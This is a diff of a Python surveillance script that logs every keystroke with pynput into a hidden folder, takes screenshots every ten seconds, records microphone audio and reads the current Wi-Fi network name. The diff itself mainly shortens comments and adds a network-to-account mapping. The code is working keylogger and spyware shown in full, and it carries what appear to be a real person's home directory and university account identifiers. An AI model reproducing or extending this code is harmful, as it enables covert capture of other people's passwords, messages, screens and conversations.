@@ -9,18 +9,18 @@ import sys
 from pynput import keyboard  # type: ignore
 from PIL import ImageGrab
 
-# Create the directory to store logs if it doesn't already exist
+# Creating log directory
 log_dir = "/Users/mannatvirk/.hiddenfolder"
 os.makedirs(log_dir, exist_ok=True)
 
-# Set up logging for keystrokes (keylog.txt)
+# keylog.txt set up
 keystroke_logger = logging.getLogger('keystroke_logger')
 keystroke_logger.setLevel(logging.INFO)
 keystroke_handler = logging.FileHandler(os.path.join(log_dir, "keylog.txt"))
 keystroke_handler.setFormatter(logging.Formatter('%(message)s'))
 keystroke_logger.addHandler(keystroke_handler)
 
-# Set up logging for general operations (log.txt)
+# log.txt setup
 operation_logger = logging.getLogger('operation_logger')
 operation_logger.setLevel(logging.INFO)
 operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
@@ -30,10 +30,10 @@ operation_logger.addHandler(operation_handler)
 # SSID to account mapping for 802.1X networks
 ssid_to_account = {
     "eduroam": "z5455543@ad.unsw.edu.au",
-    # Add other mappings as needed
+    "uniwide": "z5455543", 
+    # other mappings as needed
 }
 
-# Take a screenshot and log the event
 def take_screenshot():
     try:
         timestamp = int(time.time())
@@ -44,20 +44,19 @@ def take_screenshot():
     except Exception as e:
         operation_logger.info(f"Error taking screenshot: {e}")
 
-# Continuously take screenshots at set intervals
+# continuously take screenshots 
 def periodic_screenshots(interval=10):
     while True:
         take_screenshot()
         time.sleep(interval)
 
-# Log keystrokes to keylog.txt in a continuous line
 def on_press(key):
     try:
-        # Log standard keys
+        # standard keys
         keystroke_logger.handlers[0].stream.write(f"{key.char}")
         keystroke_logger.handlers[0].stream.flush()
     except AttributeError:
-        # Log special keys
+        # special keys
         if key == keyboard.Key.space:
             keystroke_logger.handlers[0].stream.write(" ")
         elif key == keyboard.Key.enter:
@@ -66,7 +65,6 @@ def on_press(key):
             keystroke_logger.handlers[0].stream.write(f"[{key.name}]")
         keystroke_logger.handlers[0].stream.flush()
 
-# Record audio and save to a file
 def record_audio(filename, duration, samplerate=44100, channels=1):
     try:
         recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
@@ -76,7 +74,6 @@ def record_audio(filename, duration, samplerate=44100, channels=1):
     except Exception as e:
         operation_logger.info(f"Error during audio recording: {e}")
 
-# Get the current connected Wi-Fi SSID
 def get_current_wifi_ssid():
     try:
         result = subprocess.check_output(
